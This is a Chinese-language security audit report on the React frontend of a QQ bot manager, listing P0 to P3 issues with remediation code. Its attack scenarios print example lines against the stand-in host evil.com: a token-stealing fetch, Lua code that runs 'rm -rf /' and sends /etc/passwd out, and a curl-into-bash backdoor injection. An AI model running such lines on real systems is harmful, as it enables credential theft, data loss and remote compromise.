# HanChat-QQBotManager 前端安全审计报告

**审计日期**: 2026-05-28  
**审计范围**: `E:\go\QQbot-LLbot\web\` 全部前端源码  
**项目类型**: React 18 + TypeScript + Vite 6 SPA  
**整体风险评级**: **中高风险** — 存在多个需要立即处理的严重问题

---

## 目录

1. [风险总览](#风险总览)
2. [P0 — 严重问题](#p0--严重问题)
3. [P1 — 高危问题](#p1--高危问题)
4. [P2 — 中危问题](#p2--中危问题)
5. [P3 — 低危问题](#p3--低危问题)
6. [积极安全实践](#积极安全实践)
7. [修复优先级路线图](#修复优先级路线图)

---

## 风险总览

| 级别 | 数量 | 是否存在可被立即利用? |
|------|------|------------------------|
| P0 严重 | 3 | 是（缺少纵深防御，Token 暴露路径明确） |
| P1 高危 | 2 | 取决于使用场景 |
| P2 中危 | 4 | 需要特定条件 |
| P3 低危 | 4 | 不易利用 |

---

## P0 — 严重问题

### P0-1: 缺少 Content-Security-Policy (CSP)

**文件**: `index.html` (第1-19行)  
**同样影响**: `dist/index.html`（构建产物）

```html
<!-- 当前 index.html — 无任何 CSP 设置 -->
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>HanChat-QQBotManager</title>
  <!-- ❌ 没有任何 CSP meta 标签 -->
</head>
```

**风险分析**:  
CSP 是抵御 XSS 攻击的**最后一道防线**。如果应用中存在任何未被发现的 XSS 漏洞，CSP 可以阻止：
- 内联脚本执行
- 外部恶意脚本加载
- 数据外泄到攻击者控制的服务器
- 点击劫持攻击

目前攻击者可以不受限制地：
- 注入并执行任意 JavaScript
- 加载外部恶意脚本
- 通过 `<img>` 或 `<link>` 窃取数据
- 将页面嵌入恶意 iframe 中

**修复方案**:
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self';
               script-src 'self';
               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
               font-src 'self' https://fonts.gstatic.com;
               img-src 'self' https: data:;
               connect-src 'self' ws: wss:;
               frame-ancestors 'none';
               base-uri 'self';
               form-action 'self';">
```

> **注意**: 添加 CSP 后，需要测试所有功能是否正常，尤其是 WebSocket 连接和对 QQ API 的请求。

---

### P0-2: 认证 Token 明文存储在 localStorage

**文件**: 
- `src/app/stores/authStore.ts` 第38行
- `src/app/services/api.ts` 第21行
- `src/app/services/webqqApi.ts` 第17、25行

```typescript
// authStore.ts:38
setToken: (token: string) => {
    localStorage.setItem('auth_token', token);  // ⚠️ 明文存储
    set({ token });
},

// api.ts:21 — 读取并附加到每个请求
apiClient.interceptors.request.use((config) => {
    const token = localStorage.getItem('auth_token');  // ⚠️ 明文读取
    if (token) {
        config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
});

// webqqApi.ts:17 — 另一个独立的 axios 实例
apiClient.interceptors.request.use((config) => {
    const token = localStorage.getItem('auth_token');  // ⚠️ 再次明文读取
    ...
});
```

**风险分析**:  
`localStorage` 对 JavaScript 完全可见。**任何成功的 XSS 攻击都可以直接窃取 Token**：
```javascript
// 攻击者只需执行这一行代码即可窃取 Token
fetch('https://evil.com/steal?t=' + localStorage.getItem('auth_token'));
```

Token 被窃取的后果：
- **完全账户接管** — 攻击者可以冒充管理员进行任何操作
- **Bot 控制权丧失** — 攻击者可以修改 Plugin、发送消息、读取聊天记录
- **持久化后门** — 攻击者可以植入恶意 Lua 插件

**修复方案**:

**方案 A（推荐）: 使用 httpOnly Cookie**
```typescript
// 后端登录接口返回 Set-Cookie 头:
// Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict; Path=/

// 前端无需手动管理 Token，浏览器自动附带 Cookie
apiClient.interceptors.request.use((config) => {
    config.withCredentials = true;  // 携带 Cookie
    return config;
});
```

**方案 B: Token 加密存储（临时方案）**
```typescript
// 使用 Web Crypto API 加密 Token
const encoder = new TextEncoder();
const key = await crypto.subtle.generateKey(/* ... */);

// 加密后存储
const encrypted = await crypto.subtle.encrypt(/* ... */);
localStorage.setItem('auth_token', btoa(encrypted));
```

> 方案 B 只是**纵深防御**，不能替代方案 A。如果攻击者能在你的 Origin 内执行 JavaScript，加密也无法完全保护。

---

### P0-3: Token 通过 SSE URL 查询参数暴露

**文件**: `src/app/services/webqqApi.ts` 第608行

```typescript
const token = getToken()
const url = `/api/webqq/events?self_id=${encodeURIComponent(selfId)}` +
  `&user_id=${encodeURIComponent(userId)}&type=all` +
  `${token ? `&token=${encodeURIComponent(token)}` : ''}`

// ⚠️ Token 出现在 URL 中
eventSource = new EventSource(url)
```

**风险分析**:  
URL 查询参数中的 Token 会暴露在：
- **服务器访问日志** — Nginx/Apache 默认记录完整 URL
- **浏览器的开发者工具** — Network 面板明文显示
- **Referer 头** — 如果页面中有外部链接，离开时可能泄露
- **浏览器历史记录** — URL 被完整保存
- **第三方分析/监控工具** — 可能捕获 URL 参数

更严重的是，`EventSource` API 不支持自定义请求头，因此无法使用 `Authorization: Bearer xxx` 标准方式。

**修复方案**:

**方案 A: 短期一次性 SSE Token**
```typescript
// 1. 先通过普通 axios 请求获取一次性 SSE Token
const { data } = await apiClient.post('/api/webqq/sse-token', { self_id, user_id });
// 返回 { sse_token: "short-lived-one-time-token", expires_in: 300 }

// 2. 用短期 Token 建立 SSE 连接
const url = `/api/webqq/events?sse_token=${encodeURIComponent(data.sse_token)}`;
eventSource = new EventSource(url);
```

**方案 B: 从 httpOnly Cookie 读取**
```typescript
// 配合方案 A（httpOnly Cookie），后端从 Cookie 中读取 Token
// 前端不需要在 URL 中附加 Token
const url = `/api/webqq/events?self_id=${encodeURIComponent(selfId)}` +
  `&user_id=${encodeURIComponent(userId)}&type=all`;
eventSource = new EventSource(url);  // Cookie 自动附带
```

**方案 C: 改用 WebSocket**
```typescript
// WebSocket 连接时可以附加自定义参数
const ws = new WebSocket(`wss://${host}/ws/webqq`);
ws.onopen = () => {
    ws.send(JSON.stringify({ type: 'auth', token: getToken() }));
};
```

---

## P1 — 高危问题

### P1-1: Blockly 自定义代码积木允许任意 Lua 代码注入

**文件**: `src/app/blockly/generator.ts`

| 行号 | 积木名称 | 代码 |
|------|----------|------|
| 1673 | `lua_code` | `return block.getFieldValue('CODE') + '\n';` |
| 1678 | `lua_code_output` | `return [\`(function() ${code} end)()\`, ORDER_HIGH]` |
| 2993 | `lua_code` (第二组) | 同上 |
| 3001 | `lua_code_expression` | 同上 |
| 3009 | `lua_custom_code` | 多行版本 |

```typescript
// 用户输入的任意代码直接被注入到生成的 Lua 中
generator.forBlock['lua_code'] = function(block: Blockly.Block) {
    const code = block.getFieldValue('CODE') || '';
    return code + '\n';  // ⚠️ 没有任何安全过滤
};
```

**攻击场景**:
```
1. 攻击者获取 Blockly 编辑器访问权限（可能通过 Token 窃取）
2. 拖入 "lua_code" 积木，输入恶意代码
3. 导出插件 → 代码被写入后端 main.lua → 被 Lua 运行时执行

恶意代码示例:
os.execute("rm -rf /")  -- 删除文件
http.get("http://evil.com/exfil?" .. io.popen("cat /etc/passwd"):read("*a"))  -- 数据外泄
```

**注意**: 此功能可能是设计如此（Bot 插件开发需要灵活性），但应明确记录风险。当前 `lua-analyzer.ts` 仅做语法检查，不进行安全审计。

**修复方案**:
1. 添加**服务端沙箱** — Lua 代码应在受限环境中运行
2. 禁用 `os.execute`、`io.popen` 等危险函数
3. 添加代码安全扫描（检测危险函数调用）
4. 在 UI 上添加警告提示（"此代码将直接在服务器上执行"）

---

### P1-2: `os.execute` 调用生成器

**文件**: `src/app/blockly/generator.ts` 第1497行

```typescript
generator.forBlock['time_sleep'] = function(block: Blockly.Block) {
    const seconds = generator.valueToCode(block, 'SECONDS', ORDER_NONE) || '0';
    return `os.execute("sleep " .. ${seconds})\n`;
    // ⚠️ 生成系统命令执行代码
};
```

**风险**: 虽然 `seconds` 来自数字下拉选择（当前风险有限），但如果将来改为自由输入或其他数据源，攻击者可以注入 shell 命令：
```lua
os.execute("sleep 1; curl http://evil.com/backdoor.sh | bash")
```

---

## P2 — 中危问题

### P2-1: dangerouslySetInnerHTML 误放在 className 中（JSX 语法错误）

**文件**: `src/app/pages/WebQQ.tsx`

以下 5 行存在 JSX 语法错误 — `dangerouslySetInnerHTML` 被误放在 `className` 字符串内部：

| 行号 | 消息类型 | 当前代码（Bug） |
|------|----------|-----------------|
| **679** | 转发消息 | `className="text-sm text-gray-800 dangerouslySetInnerHTML={{ __html: forwardContent }} dark:text-white"` |
| **690** | JSON消息 | `className="text-sm text-gray-800 truncate dangerouslySetInnerHTML={{ __html: jsonPrompt }} dark:text-white"` |
| **709** | Markdown | `className="text-sm text-gray-800 dangerouslySetInnerHTML={{ __html: mdText }} dark:text-white"` |
| **718** | 位置消息 | `className="text-sm text-gray-800 dangerouslySetInnerHTML={{ __html: locationTitle }} dark:text-white"` |
| **727** | 音乐消息 | `className="text-sm text-gray-800 dangerouslySetInnerHTML={{ __html: musicTitle }} dark:text-white"` |

**正确写法（对比正常工作的第668行）**:
```tsx
<div className="text-sm text-gray-800 truncate dark:text-white" 
     dangerouslySetInnerHTML={{ __html: fileName }} />
```

**影响**:
- **功能层面**: 这些消息类型的**内容不会被渲染**（`dangerouslySetInnerHTML` 被当作 className 的一部分，不是 React 属性）
- **安全层面**: 由于内容不会被渲染，当前不存在 XSS 风险，但如果将来开发者修复此 Bug 时未使用 sanitization，将引入 XSS 漏洞

**修复方案**: 既然这些消息类型只需显示纯文本，**建议直接使用 React 文本渲染**，彻底避免 `dangerouslySetInnerHTML`：
```tsx
// 替代方案：既然 sanitizeHtml 已移除所有标签，直接用文本渲染
<div className="text-sm text-gray-800 dark:text-white">
  {sanitizeHtml(forwardContent)}
</div>
```

---

### P2-2: PluginManager Markdown 渲染风险

**文件**: `src/app/pages/PluginManager.tsx` 第508-522行

```typescript
const renderMarkdown = (md: string) => {
  if (!md) return { __html: '' };
  const rawHtml = marked.parse(md, { async: false }) as string;
  const cleanHtml = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['p', 'br', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 
                    'strong', 'em', 'del', 'code', 'pre', 'blockquote', 
                    'li', 'ul', 'ol', 'a', 'img', 'hr', 'table', 'tr', 
                    'td', 'th', 'thead', 'tbody', 'div', 'span'],
    ALLOWED_ATTR: ['class', 'href', 'target', 'rel', 'src', 'alt', 'title'],
    ALLOW_DATA_ATTR: false,
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
  });
  return { __html: cleanHtml };
};
```

**风险评估**:
- ✅ `DOMPurify` 正确使用了标签/属性白名单
- ⚠️ `marked` 库可能存在未知解析漏洞（需定期更新）
- ⚠️ `ALLOWED_URI_REGEXP` 过于宽松，`[^a-z]` 和 `[a-z+.\-]+` 分支可能允许危险协议
- ⚠️ 允许 `<img>` 标签（可用于 CSRF 和跟踪像素攻击）
- ℹ️ 内容来自插件配置文件（用户编辑），攻击面有限

**修复方案**:
```typescript
// 更严格的 URI 正则
ALLOWED_URI_REGEXP: /^(https?|mailto):/i

// 如果不需要图片，移除 img 标签
ALLOWED_TAGS: [/* 移除 'img' */],

// 考虑添加 rel="noopener noreferrer nofollow" 到所有链接
ADD_ATTR: ['target'],  // 强制所有链接 target="_blank"
```

---

### P2-3: window.open 使用未验证的参数

**文件**: `src/app/components/webqq/profile/UserProfileCard.tsx` 第50-53行、219-222行

```typescript
// 第52行
window.open(`https://wpa.qq.com/msgrd?v=3&uin=${profile.uin}&site=qq&menu=yes`, '_blank')

// 第221行
window.open(`https://qm.qq.com/cgi-bin/qm/qr?k=${profile.groupCode}&jump_from=webapi`, '_blank')
```

**风险分析**:  
`profile.uin` 和 `profile.groupCode` 来自后端 API 数据。如果后端数据被篡改或中间人攻击，攻击者可以：
- 插入换行符 `%0d%0a` 进行 HTTP 响应拆分（对 `window.open` 影响有限）
- 构造恶意 URL 参数（虽然协议已硬编码为 `https:`）

**修复方案**:
```typescript
// 验证为纯数字后再使用
const handleOpenQQ = () => {
    const uin = String(profile?.uin || '').trim();
    if (!/^\d{5,}$/.test(uin)) return;  // QQ号至少5位数字
    window.open(`https://wpa.qq.com/msgrd?v=3&uin=${uin}&site=qq&menu=yes`, '_blank', 'noopener');
};
```

---

### P2-4: 两个独立的 axios 实例各自读取 Token

**文件**: `src/app/services/api.ts` 和 `src/app/services/webqqApi.ts`

```typescript
// api.ts 创建了实例 A，有自己的拦截器读取 Token
const apiClient = axios.create({ /* ... */ });
apiClient.interceptors.request.use((config) => {
    const token = localStorage.getItem('auth_token');  // 实例 A 的读取
    // ...
});

// webqqApi.ts 创建了实例 B，有自己的拦截器读取 Token  
const apiClient = axios.create({ /* ... */ });  // 同名变量，不同的实例
apiClient.interceptors.request.use((config) => {
    const token = localStorage.getItem('auth_token');  // 实例 B 的读取
    // ...
});
```

**风险**: 两个实例各自从 localStorage 读取 Token，可能导致：
- 一个实例使用过期 Token 而另一个实例已刷新
- Token 读取逻辑不一致（如果将来修改一个而忘记另一个）

**修复方案**: 抽取共享的 axios 实例或共享 Token 读取函数。

---

## P3 — 低危问题

### P3-1: SystemTipMessage 使用简单正则代替 DOMPurify

**文件**: `src/app/components/webqq/message/MessageBubble.tsx` 第93行

```typescript
const xmlContent = el.grayTipElement.xmlElement.content.replace(/<[^>]+>/g, '')
```

**问题**: 简单的正则 `<[^>]+>` 无法处理：
- 包含换行符的标签
- 大小写变体
- HTML 实体编码

**修复方案**: 统一使用 DOMPurify 或项目已有的 `sanitizeHtml` 函数。

---

### P3-2: MessageBubble.tsx 缺少 `useEffect` 导入

**文件**: `src/app/components/webqq/message/MessageBubble.tsx`

```typescript
// 第1行 — 导入缺少 useEffect
import React, { useState, memo } from 'react'

// 第83行 — 但使用了 useEffect
useEffect(() => {
```

**影响**: 这是一个 **运行时 Bug**，会导致 `ReferenceError: useEffect is not defined`。当前代码可能因为某些原因（如 Tree Shaking 或之前在某处有全局导入）侥幸工作，但应修复。

**修复**:
```typescript
import React, { useState, memo, useEffect } from 'react'
```

---

### P3-3: Google Fonts CDN 依赖

**文件**: `index.html` 第9-12行

```html
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="preload" href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;800&display=swap" ...>
```

**风险**: 
- 依赖 Google CDN 可用性（部分地区可能无法访问）
- CDN 端的 CSS 理论上可被修改
- `onload` 内联脚本是较小的风险面

**修复方案**: 使用 `@fontsource/playfair-display` npm 包实现字体自托管。

---

### P3-4: 聊天消息明文缓存到 localStorage

**文件**: `src/app/pages/WebQQ.tsx` 第134-148行

```typescript
const cacheMessages = (selfId: string, chatType: ChatType, targetId: string, messages: Message[]) => {
    const key = `webqq_messages:${selfId}:${chatType}:${targetId}`;
    localStorage.setItem(key, JSON.stringify(messages.slice(-MAX_CACHED_MESSAGES)));
};
```

**风险**: 聊天消息以明文 JSON 缓存，XSS 攻击可读取用户的聊天记录。

**建议**: 
- 考虑使用 `sessionStorage` 替代（会话结束后清除）
- 限制缓存保留时间
- 敏感对话不缓存

---

## 积极安全实践

以下是项目中已经做得好的安全措施：

| # | 措施 | 位置 |
|---|------|------|
| 1 | **DOMPurify 清理** — WebQQ.tsx 的 `sanitizeHtml` 函数配置了 `ALLOWED_TAGS: []`（完全剥离 HTML） | `WebQQ.tsx:175-184` |
| 2 | **URL 协议验证** — `isSafeUrl()` 仅允许 `https?://` | `WebQQ.tsx:189-192` |
| 3 | **安全工具模块** — `security.ts` 提供 `validateImageUrl`、`getSafeQQAvatarUrl`、`getSafeGroupAvatarUrl` | `security.ts` 全文件 |
| 4 | **rel="noopener noreferrer"** — 所有 `target="_blank"` 链接均设置了此属性 | 多处 |
| 5 | **文件导入验证** — `projectManager.ts` 实现了多层验证（大小、扩展名、MIME、XML、名称消毒） | `projectManager.ts:260-360` |
| 6 | **未启用 rehype-raw** — react-markdown 不会渲染原始 HTML | `BlocklyEditor.tsx:6844` |
| 7 | **WSS/WS 智能选择** — BotDetail.tsx 根据页面协议选择安全的 WebSocket 连接 | `BotDetail.tsx:1811` |

---

## 修复优先级路线图

### 第1周 — 立即修复（P0）

| 任务 | 预计工作量 | 风险 |
|------|-----------|------|
| 添加 CSP meta 标签到 `index.html` | 1h | 低 — 需测试不破坏现有功能 |
| 将 Token 迁移到 httpOnly Cookie | 4-8h | 中 — 需后端配合修改登录接口 |
| 修复 SSE Token 参数泄露 | 2-4h | 中 — 需实现短期 Token 机制 |

### 第2周 — 高优先级（P1-P2）

| 任务 | 预计工作量 |
|------|-----------|
| 评估 Blockly 代码执行沙箱方案 | 8-16h |
| 修复 WebQQ.tsx 中5处 JSX 语法错误 | 2h |
| 将 `dangerouslySetInnerHTML` 替换为文本渲染 | 3h |
| 收紧 PluginManager 的 DOMPurify 配置 | 1h |

### 第3-4周 — 持续改进（P2-P3）

| 任务 | 预计工作量 |
|------|-----------|
| 统一 API 客户端实例 | 2h |
| 修复 MessageBubble useEffect 导入 | 5min |
| SystemTipMessage 替换为 DOMPurify | 1h |
| 添加 `profile.uin` 数字验证 | 30min |
| 评估 Google Fonts 自托管 | 1h |

---

## 附录: 已审计文件清单

```
web/
├── index.html                                    ✅ 已审计
├── src/
│   ├── main.tsx                                  ✅ 已审计
│   ├── app/
│   │   ├── App.tsx                               ✅ 已审计
│   │   ├── stores/authStore.ts                   ✅ 已审计
│   │   ├── services/api.ts                       ✅ 已审计
│   │   ├── services/webqqApi.ts                  ✅ 已审计
│   │   ├── utils/security.ts                     ✅ 已审计
│   │   ├── pages/WebQQ.tsx                       ✅ 已审计（重点）
│   │   ├── pages/PluginManager.tsx               ✅ 已审计（重点）
│   │   ├── pages/Settings.tsx                    ✅ 已审计
│   │   ├── pages/BotList.tsx                     ✅ 已审计
│   │   ├── pages/BotDetail.tsx                   ✅ 已审计
│   │   ├── pages/Login.tsx                       ✅ 已审计
│   │   ├── blockly/generator.ts                  ✅ 已审计（重点）
│   │   ├── blockly/projectManager.ts             ✅ 已审计
│   │   ├── blockly/BlocklyEditor.tsx             ✅ 已审计
│   │   ├── blockly/lua-analyzer.ts               ✅ 已审计
│   │   ├── components/webqq/chat/RichInput.tsx   ✅ 已审计
│   │   ├── components/webqq/message/             
│   │   │   ├── MessageBubble.tsx                 ✅ 已审计
│   │   │   └── MessageElements.tsx               ✅ 已审计
│   │   └── components/webqq/profile/
│   │       └── UserProfileCard.tsx               ✅ 已审计
```

---

*报告由自动安全审计工具生成，手动验证了所有高危发现。*  
*如需对任何发现进行更深入的分析或制定具体的修复代码，请随时联系。*
